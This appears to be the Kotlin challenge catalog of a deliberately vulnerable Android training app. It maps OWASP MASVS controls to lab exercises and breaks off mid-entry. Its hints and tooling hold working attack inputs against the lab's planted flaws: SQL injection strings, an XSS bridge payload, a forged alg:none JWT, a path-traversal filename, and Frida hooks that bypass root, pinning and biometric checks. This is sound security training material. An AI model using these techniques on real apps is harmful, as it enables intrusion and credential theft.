package com.evilcorp.android.model

data class MasvsControl(
    val id: String,
    val title: String,
    val statement: String,
)

data class MasvsFamily(
    val code: String,
    val title: String,
    val controls: List<MasvsControl>,
)

/** Single source of truth for UI totals, scoring and tests. Keep ids stable. */
object ChallengeCatalog {
    /** All 24 OWASP MASVS v2 controls, statements verbatim from github.com/OWASP/masvs (controls/). */
    val masvsFamilies: List<MasvsFamily> = listOf(
        MasvsFamily(
            code = "STORAGE",
            title = "Storage",
            controls = listOf(
                MasvsControl("STORAGE-1", "Secure storage", "The app securely stores sensitive data."),
                MasvsControl("STORAGE-2", "Leakage prevention", "The app prevents leakage of sensitive data."),
            ),
        ),
        MasvsFamily(
            code = "CRYPTO",
            title = "Cryptography",
            controls = listOf(
                MasvsControl("CRYPTO-1", "Strong cryptography", "The app employs current strong cryptography and uses it according to industry best practices."),
                MasvsControl("CRYPTO-2", "Key management", "The app performs key management according to industry best practices."),
            ),
        ),
        MasvsFamily(
            code = "AUTH",
            title = "Authentication and Authorization",
            controls = listOf(
                MasvsControl("AUTH-1", "Authentication protocols", "The app uses secure authentication and authorization protocols and follows the relevant best practices."),
                MasvsControl("AUTH-2", "Local authentication", "The app performs local authentication securely according to the platform best practices."),
                MasvsControl("AUTH-3", "Additional authentication", "The app secures sensitive operations with additional authentication."),
            ),
        ),
        MasvsFamily(
            code = "NETWORK",
            title = "Network Communication",
            controls = listOf(
                MasvsControl("NETWORK-1", "Secure network traffic", "The app secures all network traffic according to the current best practices."),
                MasvsControl("NETWORK-2", "Identity pinning", "The app performs identity pinning for all remote endpoints under the developer's control."),
            ),
        ),
        MasvsFamily(
            code = "PLATFORM",
            title = "Platform Interaction",
            controls = listOf(
                MasvsControl("PLATFORM-1", "IPC", "The app uses IPC mechanisms securely."),
                MasvsControl("PLATFORM-2", "WebViews", "The app uses WebViews securely."),
                MasvsControl("PLATFORM-3", "User interface", "The app uses the user interface securely."),
            ),
        ),
        MasvsFamily(
            code = "CODE",
            title = "Code Quality",
            controls = listOf(
                MasvsControl("CODE-1", "Up-to-date platform", "The app requires an up-to-date platform version."),
                MasvsControl("CODE-2", "Enforced updates", "The app has a mechanism for enforcing app updates."),
                MasvsControl("CODE-3", "Secure components", "The app only uses software components without known vulnerabilities."),
                MasvsControl("CODE-4", "Input validation", "The app validates and sanitizes all untrusted inputs."),
            ),
        ),
        MasvsFamily(
            code = "RESILIENCE",
            title = "Resilience Against Reverse Engineering and Tampering",
            controls = listOf(
                MasvsControl("RESILIENCE-1", "Platform integrity", "The app validates the integrity of the platform."),
                MasvsControl("RESILIENCE-2", "Anti-tampering", "The app implements anti-tampering mechanisms."),
                MasvsControl("RESILIENCE-3", "Anti-static analysis", "The app implements anti-static analysis mechanisms."),
                MasvsControl("RESILIENCE-4", "Anti-dynamic analysis", "The app implements anti-dynamic analysis techniques."),
            ),
        ),
        MasvsFamily(
            code = "PRIVACY",
            title = "Privacy",
            controls = listOf(
                MasvsControl("PRIVACY-1", "Data minimization", "The app minimizes access to sensitive data and resources."),
                MasvsControl("PRIVACY-2", "No user identification", "The app prevents identification of the user."),
                MasvsControl("PRIVACY-3", "Transparency", "The app is transparent about data collection and usage."),
                MasvsControl("PRIVACY-4", "User control", "The app offers user control over their data."),
            ),
        ),
    )

    val all: List<Challenge> = listOf(
        Challenge(
            id = "prefs", title = "SharedPreferences Storage",
            description = "Session secrets written to SharedPreferences in plaintext.",
            difficulty = Difficulty.Easy, area = Area.Storage,
            cwe = "CWE-312", masvs = "STORAGE-1", maswe = "MASWE-0001", mastg = "MASTG-TEST-0287", cvss = "5.0 (Medium)",
            hints = listOf(
                "Android keeps SharedPreferences as XML files inside the app sandbox.",
                "Look under /data/data/com.evilcorp.android/shared_prefs/.",
                "On a debuggable build: adb shell run-as com.evilcorp.android cat shared_prefs/evilcorp_session.xml",
            ),
            tooling = "adb shell run-as com.evilcorp.android ls shared_prefs\n" +
                "adb shell run-as com.evilcorp.android cat shared_prefs/evilcorp_session.xml\n\n" +
                "// Frida: log every SharedPreferences write\n" +
                "Java.perform(() => {\n" +
                "  const E = Java.use('android.app.SharedPreferencesImpl\$EditorImpl');\n" +
                "  E.putString.implementation = function (k, v) { console.log(k + ' = ' + v); return this.putString(k, v); };\n" +
                "});",
        ),
        Challenge(
            id = "sqli", title = "SQLite Injection",
            description = "Login query built by string concatenation against a local SQLite database.",
            difficulty = Difficulty.Medium, area = Area.Code,
            cwe = "CWE-89", masvs = "CODE-4", maswe = "MASWE-0050", mastg = "MASTG-TEST-0025", cvss = "7.5 (High)",
            hints = listOf(
                "The query is SELECT username, role, note FROM users WHERE username='…' AND password='…'.",
                "Try closing the quote yourself: ' OR 1=1 --",
                "You want the admin row: ' OR role='admin' --",
            ),
            tooling = "// Frida: print every SQL statement\n" +
                "Java.perform(() => {\n" +
                "  const DB = Java.use('android.database.sqlite.SQLiteDatabase');\n" +
                "  DB.rawQuery.overload('java.lang.String', '[Ljava.lang.String;').implementation = function (q, a) {\n" +
                "    console.log('SQL: ' + q); return this.rawQuery(q, a);\n" +
                "  };\n" +
                "});",
        ),
        Challenge(
            id = "secrets", title = "Hardcoded Secrets",
            description = "An API key compiled into the APK gates a privileged endpoint.",
            difficulty = Difficulty.Medium, area = Area.Storage,
            cwe = "CWE-798", masvs = "STORAGE-1", maswe = "MASWE-0004", mastg = "MASTG-TEST-0212", cvss = "7.5 (High)",
            hints = listOf(
                "The key never leaves the device, so it must be inside the APK.",
                "Decompile with jadx or run `apktool d` and grep for 'key'.",
                "The key is Base64-encoded in HardcodedSecretsLab.kt, decode it.",
            ),
            tooling = "apktool d app-debug.apk -o out && grep -ri 'EC_API' out/smali*\n" +
                "jadx -d out-jadx app-debug.apk   # open HardcodedSecretsLab\n" +
                "echo '<base64>' | base64 -d",
        ),
        Challenge(
            id = "logging", title = "Insecure Logging",
            description = "Credentials and a session token are written to logcat.",
            difficulty = Difficulty.Easy, area = Area.Storage,
            cwe = "CWE-532", masvs = "STORAGE-2", maswe = "MASWE-0005", mastg = "MASTG-TEST-0203", cvss = "5.0 (Medium)",
            hints = listOf(
                "Press Login, then look at the system log, not the screen.",
                "adb logcat | grep EvilCorpAuth",
                "The token field in the log line is the flag.",
            ),
            tooling = "adb logcat -c && adb logcat -s EvilCorpAuth:D\n" +
                "adb logcat --pid=\$(adb shell pidof com.evilcorp.android)",
        ),
        Challenge(
            id = "crypto", title = "Broken Cryptography",
            description = "AES-ECB with a key hardcoded in the app protects the vault blob.",
            difficulty = Difficulty.Medium, area = Area.Crypto,
            cwe = "CWE-327", masvs = "CRYPTO-1", maswe = "MASWE-0007", mastg = "MASTG-TEST-0232", cvss = "7.4 (High)",
            hints = listOf(
                "Identical plaintext blocks encrypt to identical ciphertext blocks in ECB mode.",
                "Find the 16-byte key in BrokenCryptoLab.kt (jadx).",
                "Decrypt the Base64 blob with AES/ECB/PKCS5Padding using that key.",
            ),
            tooling = "echo '<blob>' | base64 -d | openssl enc -d -aes-128-ecb -K \$(printf '<key>' | xxd -p)\n\n" +
                "// Frida: capture keys passed to javax.crypto\n" +
                "Java.perform(() => {\n" +
                "  const S = Java.use('javax.crypto.spec.SecretKeySpec');\n" +
                "  S.\$init.overload('[B', 'java.lang.String').implementation = function (k, a) {\n" +
                "    console.log(a + ' key=' + Java.use('java.lang.String').\$new(k)); return this.\$init(k, a);\n" +
                "  };\n" +
                "});",
        ),
        Challenge(
            id = "random", title = "Weak Random Generation",
            description = "A password-reset token comes from java.util.Random seeded with a leaked timestamp.",
            difficulty = Difficulty.Medium, area = Area.Crypto,
            cwe = "CWE-338", masvs = "CRYPTO-1", maswe = "MASWE-0012", mastg = "MASTG-TEST-0204", cvss = "7.5 (High)",
            hints = listOf(
                "java.util.Random is a deterministic LCG: same seed, same output.",
                "The 'requested at' epoch second is the seed.",
                "token = java.util.Random(seed).nextLong().toString(36)",
            ),
            tooling = "// jshell or Kotlin script\n" +
                "jshell> new java.util.Random(<epochSeconds>L).nextLong()\n" +
                "jshell> Long.toString(new java.util.Random(<epochSeconds>L).nextLong(), 36)",
        ),
        Challenge(
            id = "webview", title = "WebView JavaScript Bridge",
            description = "Unsanitized HTML is rendered in a WebView that exposes a native JS interface.",
            difficulty = Difficulty.Medium, area = Area.Platform,
            cwe = "CWE-79", masvs = "PLATFORM-2", maswe = "MASWE-0033", mastg = "MASTG-TEST-0334", cvss = "8.1 (High)",
            hints = listOf(
                "Your input is placed into the page without encoding, so HTML and script run.",
                "A Java object is exposed to JavaScript under the name EvilBridge.",
                "<script>document.body.innerText = EvilBridge.getFlag()</script>",
            ),
            tooling = "// Inject:\n<script>document.body.innerText = EvilBridge.getFlag()</script>\n\n" +
                "// Inspect via chrome://inspect (WebView debugging is enabled in this lab)\n" +
                "adb forward tcp:9222 localabstract:webview_devtools_remote_\$(adb shell pidof com.evilcorp.android)",
        ),
        Challenge(
            id = "provider", title = "Exported ContentProvider",
            description = "A ContentProvider is exported without permissions and returns internal notes.",
            difficulty = Difficulty.Medium, area = Area.Platform,
            cwe = "CWE-926", masvs = "PLATFORM-1", maswe = "MASWE-0018", mastg = "MASTG-TEST-0356", cvss = "7.5 (High)",
            hints = listOf(
                "Check AndroidManifest.xml for android:exported=\"true\" on <provider>.",
                "The authority is com.evilcorp.android.notes.",
                "adb shell content query --uri content://com.evilcorp.android.notes/notes",
            ),
            tooling = "adb shell content query --uri content://com.evilcorp.android.notes/notes\n" +
                "adb shell dumpsys package com.evilcorp.android | grep -A3 -i provider\n" +
                "drozer console connect  ->  run app.provider.info -a com.evilcorp.android",
        ),
        Challenge(
            id = "deeplink", title = "Deep Link Abuse",
            description = "An exported activity trusts parameters from the evilcorp:// URL scheme.",
            difficulty = Difficulty.Medium, area = Area.Platform,
            cwe = "CWE-939", masvs = "PLATFORM-1", maswe = "MASWE-0029", mastg = "MASTG-TEST-0394", cvss = "6.5 (Medium)",
            hints = listOf(
                "Find the <intent-filter> with the evilcorp scheme in the manifest.",
                "The handler supports a 'settings' host with a debug parameter.",
                "adb shell am start -a android.intent.action.VIEW -d \"evilcorp://settings?debug=1\"",
            ),
            tooling = "adb shell am start -a android.intent.action.VIEW -d \"evilcorp://settings?debug=1\"\n" +
                "adb shell am start -a android.intent.action.VIEW -d \"evilcorp://pay?to=attacker&amount=999\"",
        ),
        Challenge(
            id = "root", title = "Root Detection Bypass",
            description = "A client-side root check decides whether the secure area opens.",
            difficulty = Difficulty.Medium, area = Area.Resilience,
            cwe = "CWE-693", masvs = "RESILIENCE-1", maswe = "MASWE-0051", mastg = "MASTG-TEST-0325", cvss = "4.3 (Medium)",
            hints = listOf(
                "The lab plants a synthetic su binary so the check always fires.",
                "The decision is a single boolean returned by RootChecker.isRooted().",
                "Hook it with Frida and return false. The indicator is re-planted on every attempt.",
            ),
            tooling = "// Frida\n" +
                "Java.perform(() => {\n" +
                "  const R = Java.use('com.evilcorp.android.labs.RootChecker');\n" +
                "  R.isRooted.implementation = function (ctx) { return false; };\n" +
                "});\n\n" +
                "# or: objection -g com.evilcorp.android explore -> android root disable\n" +
                "# or: patch the APK (apktool d, edit smali, apktool b, apksigner)",
        ),
        Challenge(
            id = "cleartext", title = "Cleartext HTTP Session",
            description = "Credentials and a session token travel over unencrypted HTTP.",
            difficulty = Difficulty.Medium, area = Area.Network,
            cwe = "CWE-319", masvs = "NETWORK-1", maswe = "MASWE-0026", mastg = "MASTG-TEST-0236", cvss = "7.4 (High)",
            hints = listOf(
                "The manifest and network security config both permit cleartext traffic.",
                "Start the lab server, then forward its port to your computer.",
                "adb forward tcp:8080 tcp:8080 && curl -i -d 'user=alice&pass=wonderland' http://127.0.0.1:8080/login",
            ),
            tooling = "adb forward tcp:8080 tcp:8080\n" +
                "curl -i -d 'user=alice&pass=wonderland' http://127.0.0.1:8080/login\n" +
                "# look at the Set-Cookie header",
        ),
        Challenge(
            id = "external", title = "External Storage Leak",
            description = "A credentials backup is written to shared external storage.",
            difficulty = Difficulty.Easy, area = Area.Storage,
            cwe = "CWE-922", masvs = "STORAGE-2", maswe = "MASWE-0002", mastg = "MASTG-TEST-0200", cvss = "5.5 (Medium)",
            hints = listOf(
                "Files under external storage are not private to the app.",
                "Path: /sdcard/Android/data/com.evilcorp.android/files/",
                "adb pull /sdcard/Android/data/com.evilcorp.android/files/backup_credentials.txt",
            ),
            tooling = "adb shell ls /sdcard/Android/data/com.evilcorp.android/files/\n" +
                "adb pull /sdcard/Android/data/com.evilcorp.android/files/backup_credentials.txt",
        ),
        Challenge(
            id = "broadcast", title = "Unprotected Broadcast Receiver",
            description = "An exported receiver accepts privilege changes from any app.",
            difficulty = Difficulty.Hard, area = Area.Platform,
            cwe = "CWE-925", masvs = "PLATFORM-1", maswe = "MASWE-0018", mastg = "MASTG-TEST-0366", cvss = "7.8 (High)",
            hints = listOf(
                "Look for <receiver android:exported=\"true\"> and its intent-filter action.",
                "The receiver reads a string extra named role.",
                "adb shell am broadcast -a com.evilcorp.android.ACTION_PROMOTE --es role admin -n com.evilcorp.android/.labs.PromoteReceiver",
            ),
            tooling = "adb shell am broadcast -a com.evilcorp.android.ACTION_PROMOTE --es role admin \\\n" +
                "  -n com.evilcorp.android/.labs.PromoteReceiver",
        ),
        Challenge(
            id = "clipboard", title = "Clipboard Leakage",
            description = "A secret is copied to the system clipboard without the sensitive flag.",
            difficulty = Difficulty.Easy, area = Area.Platform,
            cwe = "CWE-200", masvs = "PLATFORM-1", maswe = "MASWE-0030", mastg = "", cvss = "4.0 (Medium)",
            hints = listOf(
                "Any foreground app (and keyboards, clipboard managers) can read the clipboard.",
                "Press Copy, then paste into the field below.",
                "Hook ClipboardManager.setPrimaryClip to observe what the app copies.",
            ),
            tooling = "// Frida\n" +
                "Java.perform(() => {\n" +
                "  const C = Java.use('android.content.ClipboardManager');\n" +
                "  C.setPrimaryClip.implementation = function (clip) {\n" +
                "    console.log(clip.getItemAt(0).getText()); return this.setPrimaryClip(clip);\n" +
                "  };\n" +
                "});",
        ),
        Challenge(
            id = "pin", title = "Vulnerable Vault PIN",
            description = "A 4-digit PIN checked client-side with an unsalted MD5 and no lockout.",
            difficulty = Difficulty.Hard, area = Area.Auth,
            cwe = "CWE-307", masvs = "AUTH-2", maswe = "MASWE-0020", mastg = "", cvss = "6.8 (Medium)",
            hints = listOf(
                "There are only 10,000 possible PINs and the app never rate-limits attempts.",
                "The expected hash is embedded in PinVaultLab.kt, MD5 of the PIN.",
                "Brute-force offline: for i in 0000..9999, compare md5(i) with the embedded hash.",
            ),
            tooling = "for i in \$(seq -w 0 9999); do\n" +
                "  [ \"\$(printf \$i | md5)\" = \"88cf91a1aef212f3c2cd12406983427d\" ] && echo PIN=\$i && break\n" +
                "done",
        ),
        Challenge(
            id = "screenshot", title = "Screenshot Leakage",
            description = "A sensitive screen can be captured because FLAG_SECURE is not set.",
            difficulty = Difficulty.Easy, area = Area.Platform,
            cwe = "CWE-200", masvs = "PLATFORM-3", maswe = "MASWE-0038", mastg = "MASTG-TEST-0291", cvss = "4.0 (Medium)",
            hints = listOf(
                "Without FLAG_SECURE the OS lets screenshots, screen recordings and the Recents thumbnail see the content.",
                "The secret is only on screen for a fraction of a second. Record the screen instead of trying to read it.",
                "Start adb shell screenrecord, press Flash, stop the recording, pull it and step through the frames.",
            ),
            tooling = "adb shell screenrecord --time-limit 15 /sdcard/rec.mp4   # press Flash meanwhile\n" +
                "adb pull /sdcard/rec.mp4\n" +
                "ffmpeg -i rec.mp4 frames/%04d.png              # step through the frames\n" +
                "\n" +
                "# With the fix switched on, the recording shows a black window instead.",
        ),
        Challenge(
            id = "keystore", title = "PKCS#12 Keystore Misuse",
            description = "A portable PKCS#12 file with a default password replaces AndroidKeyStore.",
            difficulty = Difficulty.Medium, area = Area.Crypto,
            cwe = "CWE-522", masvs = "CRYPTO-2", maswe = "MASWE-0003", mastg = "MASTG-TEST-0212", cvss = "6.8 (Medium)",
            hints = listOf(
                "Provision the store first; it writes files/vault.p12 inside the app sandbox.",
                "Inspect WeakKeystore in jadx to find KEYSTORE_PASS.",
                "Enter the default Java keystore password 'changeit' or pull vault.p12 via run-as.",
            ),
            tooling = "adb shell run-as com.evilcorp.android cat files/vault.p12 > vault.p12\n" +
                "keytool -list -v -keystore vault.p12 -storetype PKCS12 -storepass changeit",
        ),
        Challenge(
            id = "backup", title = "Android Backup & Plaintext Files",
            description = "Plaintext sync credentials in filesDir exposed by android:allowBackup=\"true\".",
            difficulty = Difficulty.Easy, area = Area.Storage,
            cwe = "CWE-312", masvs = "STORAGE-2", maswe = "MASWE-0006", mastg = "MASTG-TEST-0216", cvss = "5.5 (Medium)",
            hints = listOf(
                "Press 'Write cloud sync config' to create the file in internal storage.",
                "Check files/cloud_sync_config.json inside the sandbox.",
                "adb shell run-as com.evilcorp.android cat files/cloud_sync_config.json",
            ),
            tooling = "adb shell run-as com.evilcorp.android cat files/cloud_sync_config.json\n" +
                "adb backup -f backup.ab com.evilcorp.android",
        ),
        Challenge(
            id = "sslpinning", title = "SSL Pinning Bypass",
            description = "Client-side SPKI certificate pinning enforced by a single boolean check.",
            difficulty = Difficulty.Hard, area = Area.Network,
            cwe = "CWE-295", masvs = "NETWORK-2", maswe = "MASWE-0028", mastg = "MASTG-TEST-0242", cvss = "5.9 (Medium)",
            hints = listOf(
                "SslPinValidator.verifyCertificatePin() compares the presented pin against EXPECTED_PIN.",
                "Find SslPinValidator.EXPECTED_PIN in jadx or hook verifyCertificatePin() in Frida.",
                "Expected pin: sha256/9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08",
            ),
            tooling = "// Frida\n" +
                "Java.perform(() => {\n" +
                "  const V = Java.use('com.evilcorp.android.labs.SslPinValidator');\n" +
                "  V.verifyCertificatePin.implementation = function (pin) { return true; };\n" +
                "});",
        ),
        Challenge(
            id = "webviewfile", title = "WebView Universal File Access",
            description = "WebView with allowFileAccess and allowUniversalAccessFromFileURLs reads sandbox files.",
            difficulty = Difficulty.Hard, area = Area.Platform,
            cwe = "CWE-200", masvs = "PLATFORM-2", maswe = "MASWE-0034", mastg = "MASTG-TEST-0252", cvss = "7.5 (High)",
            hints = listOf(
                "The lab writes a confidential note to files/internal_audit.txt on launch.",
                "The WebView allows loading file:// URLs directly.",
                "Load file:///data/data/com.evilcorp.android/files/internal_audit.txt",
            ),
            tooling = "# Enter in the WebView URL bar:\n" +
                "file:///data/data/com.evilcorp.android/files/internal_audit.txt",
        ),
        Challenge(
            id = "biometric", title = "Biometric Auth Bypass",
            description = "Event-bound biometric gate not tied to a Keystore CryptoObject.",
            difficulty = Difficulty.Hard, area = Area.Auth,
            cwe = "CWE-287", masvs = "AUTH-2", maswe = "MASWE-0020", mastg = "MASTG-TEST-0327", cvss = "7.1 (High)",
            hints = listOf(
                "The vault checks BiometricGate.isBiometricVerified() without decrypting via Keystore.",
                "Hook BiometricGate.isBiometricVerified() with Frida to return true, or check QA_PROP in jadx.",
                "adb shell setprop debug.evilcorp.bio_override true",
            ),
            tooling = "// Frida\n" +
                "Java.perform(() => {\n" +
                "  const B = Java.use('com.evilcorp.android.labs.BiometricGate');\n" +
                "  B.isBiometricVerified.implementation = function () { return true; };\n" +
                "});\n\n" +
                "# or exploit the leftover QA system property:\n" +
                "adb shell setprop debug.evilcorp.bio_override true",
        ),
        Challenge(
            id = "antidebug", title = "Debugger & Frida Detection",
            description = "Telemetry key gated behind Debug.isDebuggerConnected, FLAG_DEBUGGABLE and TracerPid.",
            difficulty = Difficulty.Hard, area = Area.Resilience,
            cwe = "CWE-693", masvs = "RESILIENCE-4", maswe = "MASWE-0064", mastg = "MASTG-TEST-0353", cvss = "4.3 (Medium)",
            hints = listOf(
                "AntiDebugCheck.isBeingDebugged() triggers because the training APK is debuggable.",
                "Hook isBeingDebugged() in Frida to return false, or inspect QA_BYPASS_PROP in AntiDebugLab.kt.",
                "adb shell setprop debug.evilcorp.allow_debug 1",
            ),
            tooling = "// Frida\n" +
                "Java.perform(() => {\n" +
                "  const A = Java.use('com.evilcorp.android.labs.AntiDebugCheck');\n" +
                "  A.isBeingDebugged.implementation = function (ctx) { return false; };\n" +
                "});\n\n" +
                "# or set the QA property discovered in jadx:\n" +
                "adb shell setprop debug.evilcorp.allow_debug 1",
        ),
        Challenge(
            id = "keyboard", title = "Keyboard & IME Cache Leak",
            description = "Predictive text caches sensitive recovery phrases in a personalized dictionary.",
            difficulty = Difficulty.Easy, area = Area.Storage,
            cwe = "CWE-200", masvs = "STORAGE-2", maswe = "MASWE-0036", mastg = "MASTG-TEST-0258", cvss = "4.3 (Medium)",
            hints = listOf(
                "Press 'Sync IME learned dictionary' to write the personalized suggestion cache.",
                "Look for ime_learned_words.txt inside the app's files/ directory.",
                "adb shell run-as com.evilcorp.android cat files/ime_learned_words.txt",
            ),
            tooling = "adb shell run-as com.evilcorp.android cat files/ime_learned_words.txt",
        ),
        Challenge(
            id = "tampering", title = "Bytecode Tampering & Licensing",
            description = "Enterprise feature flag gated by an XOR license check in IntegrityGate.",
            difficulty = Difficulty.Hard, area = Area.Resilience,
            cwe = "CWE-353", masvs = "RESILIENCE-2", maswe = "MASWE-0058", mastg = "MASTG-TEST-0341", cvss = "5.3 (Medium)",
            hints = listOf(
                "Decompile IntegrityGate in TamperingLab.kt and inspect MASKED.",
                "Each integer in MASKED is XORed with 0x5A to form the license string.",
                "The decoded license key is EC-ENT-2026-PRO (or hook verifyLicense() to return true).",
            ),
            tooling = "python3 -c 'm=[0x1F,0x19,0x77,0x1F,0x14,0x0E,0x77,0x68,0x6A,0x68,0x6C,0x77,0x0A,0x08,0x15];print(\"\".join(chr(x^0x5A) for x in m))'\n\n" +
                "// Frida\n" +
                "Java.perform(() => {\n" +
                "  Java.use('com.evilcorp.android.labs.IntegrityGate').verifyLicense.implementation = () => true;\n" +
                "});",
        ),
        Challenge(
            id = "httpcache", title = "HTTP Disk Cache Leak",
            description = "Authenticated API responses are cached unencrypted under cache/http_cache/.",
            difficulty = Difficulty.Medium, area = Area.Storage,
            cwe = "CWE-524", masvs = "STORAGE-2", maswe = "MASWE-0001", mastg = "MASTG-TEST-0207", cvss = "5.5 (Medium)",
            hints = listOf(
                "Press 'Fetch /v1/account/statement' to populate the HTTP disk cache.",
                "The UI redacts audit_token, but the raw response is stored under cache/http_cache/.",
                "adb shell run-as com.evilcorp.android cat cache/http_cache/entry_statement_v1.0",
            ),
            tooling = "adb shell run-as com.evilcorp.android ls -la cache/http_cache/\n" +
                "adb shell run-as com.evilcorp.android cat cache/http_cache/entry_statement_v1.0",
        ),
        Challenge(
            id = "pendingintent", title = "Mutable PendingIntent Hijack",
            description = "An implicit base Intent wrapped with FLAG_MUTABLE lets receivers hijack execution.",
            difficulty = Difficulty.Hard, area = Area.Platform,
            cwe = "CWE-927", masvs = "PLATFORM-1", maswe = "MASWE-0032", mastg = "MASTG-TEST-0381", cvss = "7.8 (High)",
            hints = listOf(
                "Press 'Broadcast mutable PendingIntent' or trigger PendingIntentHijackReceiver via adb.",
                "The receiver listens for com.evilcorp.android.ACTION_DISPATCH_PI.",
                "Press 'Broadcast mutable PendingIntent', then 'Refresh capture log' (or check logcat EvilCorpPI).",
            ),
            tooling = "adb logcat -s EvilCorpPI:W\n" +
                "adb shell am broadcast -a com.evilcorp.android.ACTION_DISPATCH_PI \\\n" +
                "  --es hijack_mode hijack -n com.evilcorp.android/.labs.PendingIntentHijackReceiver",
        ),
        Challenge(
            id = "tapjacking", title = "Tapjacking / Obscured Touch",
            description = "Sensitive approval button accepts touches when covered by an overlay window.",
            difficulty = Difficulty.Medium, area = Area.Platform,
            cwe = "CWE-1021", masvs = "PLATFORM-3", maswe = "MASWE-0039", mastg = "MASTG-TEST-0340", cvss = "6.1 (Medium)",
            hints = listOf(
                "Keep 'Simulated bait overlay: ON' and 'filterTouchesWhenObscured: OFF'.",
                "Tap the green 'Tap Here to Claim Free Coffee' bait button.",
                "Now toggle 'filterTouchesWhenObscured: ON' to see how Android blocks the obscured touch.",
            ),
            tooling = "// Verify in layouts or View code:\n" +
                "view.filterTouchesWhenObscured = true\n" +
                "window.setHideOverlayWindows(true) // API 31+",
        ),
        Challenge(
            id = "memory", title = "Sensitive Data in Heap Memory",
            description = "Clearing the UI leaves the master secret in an immutable String on the JVM heap.",
            difficulty = Difficulty.Hard, area = Area.Storage,
            cwe = "CWE-316", masvs = "STORAGE-2", maswe = "MASWE-0024", mastg = "MASTG-TEST-0011", cvss = "6.2 (Medium)",
            hints = listOf(
                "Press '1. Load secret into memory', then '2. Lock & Clear Screen'.",
                "Dump the Java heap with `adb shell am dumpheap` or read MemoryVault.retainedHeapSecret.",
                "adb shell am dumpheap com.evilcorp.android /data/local/tmp/ec.hprof && adb pull /data/local/tmp/ec.hprof && strings ec.hprof | grep HEAP_MASTER_KEY",
            ),
            tooling = "adb shell am dumpheap com.evilcorp.android /data/local/tmp/ec.hprof\n" +
                "adb pull /data/local/tmp/ec.hprof && strings ec.hprof | grep HEAP_MASTER_KEY\n\n" +
                "// Frida\n" +
                "Java.perform(() => {\n" +
                "  console.log(Java.use('com.evilcorp.android.labs.MemoryVault').retainedHeapSecret.value);\n" +
                "});",
        ),
        Challenge(
            id = "intentredirect", title = "Intent Redirection",
            description = "An exported proxy activity launches non-exported internal activities via extras.",
            difficulty = Difficulty.Hard, area = Area.Platform,
            cwe = "CWE-940", masvs = "PLATFORM-1", maswe = "MASWE-0032", mastg = "MASTG-TEST-0364", cvss = "8.1 (High)",
            hints = listOf(
                "InternalAdminActivity has android:exported=\"false\" and cannot be started directly.",
                "IntentRedirectActivity is exported and reads a string extra named 'target_class'.",
                "adb shell am start -n com.evilcorp.android/.labs.IntentRedirectActivity --es target_class com.evilcorp.android.labs.InternalAdminActivity",
            ),
            tooling = "# Direct launch fails with SecurityException:\n" +
                "adb shell am start -n com.evilcorp.android/.labs.InternalAdminActivity\n\n" +
                "# Pivot via exported IntentRedirectActivity:\n" +
                "adb shell am start -n com.evilcorp.android/.labs.IntentRedirectActivity \\\n" +
                "  --es target_class com.evilcorp.android.labs.InternalAdminActivity",
        ),
        Challenge(
            id = "pathtraversal", title = "Zip Slip / Path Traversal",
            description = "Archive extraction joins paths without canonicalPath validation.",
            difficulty = Difficulty.Hard, area = Area.Code,
            cwe = "CWE-22", masvs = "CODE-4", maswe = "MASWE-0050", mastg = "", cvss = "7.5 (High)",
            hints = listOf(
                "The importer writes to File(files/themes, entryName) without checking for '..'.",
                "The vault unlocks when files/admin_override.flag contains UNLOCK.",
                "Set filename to ../admin_override.flag and content to UNLOCK, then extract.",
            ),
            tooling = "# Filename:\n../admin_override.flag\n# Content:\nUNLOCK",
        ),
        Challenge(
            id = "jwt", title = "Insecure JWT & alg:none",
            description = "Client-side JWT authorization verifies HS256 signatures but still trusts unsigned alg:none tokens.",
            difficulty = Difficulty.Medium, area = Area.Auth,
            cwe = "CWE-347", masvs = "AUTH-1", maswe = "MASWE-0018", mastg = "", cvss = "8.2 (High)",
            hints = listOf(
                "JwtSessionVerifier.isAdminToken() picks the verification method from the token's own header.",
                "Editing the claims of the HS256 token breaks its signature. What happens when alg is \"none\"?",
                "Token: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJqLmRvZSIsInJvbGUiOiJhZG1pbiIsImRlcHQiOiJleGVjdXRpdmUifQ.",
            ),
            tooling = "python3 -c 'import base64;b=lambda s:base64.urlsafe_b64encode(s.encode()).decode().rstrip(\"=\");print(b(\"{\\\"alg\\\":\\\"none\\\",\\\"typ\\\":\\\"JWT\\\"}\")+\".\"+b(\"{\\\"sub\\\":\\\"j.doe\\\",\\\"role\\\":\\\"admin\\\"}\")+\".\")'",
        ),
        Challenge(
            id = "stepup", title = "Missing Step-Up Authentication",
            description = "High-value wire transfers can skip step-up verification through a trusted-channel shortcut.",
            difficulty = Difficulty.Hard, area = Area.Auth,
            cwe = "CWE-306", masvs = "AUTH-3", maswe = "MASWE-0023", mastg = "", cvss = "7.7 (High)",
            hints = listOf(
                "Inspect StepUpAuthController.isStepUpSatisfied() in jadx.",
                "When channel equals TRUSTED_BATCH_CHANNEL, the OTP/FIDO2 check is bypassed.",
                "Set the Request channel field to batch_internal and authorize the wire.",
            ),
            tooling = "// Frida\n" +
                "Java.perform(() => {\n" +
                "  Java.use('com.evilcorp.android.labs.StepUpAuthController').isStepUpSatisfied.implementation = () => true;\n" +
                "});",
        ),
        Challenge(
            id = "trustmanager", title = "TrustAll X509TrustManager",
            description = "Custom TrustManager and HostnameVerifier accept self-signed MITM certificates.",
            difficulty = Difficulty.Medium, area = Area.Network,
            cwe = "CWE-295", masvs = "NETWORK-1", maswe = "MASWE-0027", mastg = "MASTG-TEST-0282", cvss = "7.4 (High)",
            hints = listOf(
                "InsecureTlsClient.acceptServerCertificate() models an empty checkServerTrusted() implementation.",
                "Toggle HostnameVerifier to ALLOW_ALL so mismatched Subject CNs are accepted.",
                "Press 'Intercept TLS Handshake (MITM)' while ALLOW_ALL is enabled.",
            ),
            tooling = "// Audit APK for permissive TrustManagers & HostnameVerifiers:\n" +
                "jadx -d out app-debug.apk && grep -rn 'checkServerTrusted\\|ALLOW_ALL_HOSTNAME_VERIFIER' out/",
        ),
        Challenge(
            id = "ivreuse", title = "Static IV & Nonce Reuse",
            description = "Two packets encrypted with AES-CTR under the same key and a hardcoded IV leak each other's plaintext.",
            difficulty = Difficulty.Hard, area = Area.Crypto,
            cwe = "CWE-323", masvs = "CRYPTO-1", maswe = "MASWE-0007", mastg = "MASTG-TEST-0309", cvss = "7.4 (High)",
            hints = listOf(
                "In CTR mode the same key + IV produces the same keystream, so C1 xor C2 = P1 xor P2.",
